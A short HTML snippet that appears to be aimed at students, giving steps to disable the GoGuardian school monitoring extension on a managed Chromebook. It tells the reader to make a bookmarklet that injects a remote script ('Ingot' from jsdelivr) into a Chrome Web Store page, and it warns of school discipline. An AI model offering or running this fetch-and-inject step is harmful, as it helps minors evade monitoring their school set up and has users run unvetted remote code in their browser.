    First step:
    <br>
    <a href="https://chrome.google.com/webstorex">Open this link</a>
    <br><br>
    Second step:
    <br>
    Use this bookmarklet script by making a bookmark and pasting it into the empty Url section and clicking it on the page you just opened - 
    <br><br>
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js%27;document.body.appendChild(a);%7D())

    After you've done that, you have to keep the page open otherwise default settings will override it and GoGuardian will activate. Note that this process can be repeated and can be undone whenever you like, and that you may also risk getting in trouble with your school. Be careful with this power and just generally don't act stupid. This means you Caleb Myers.
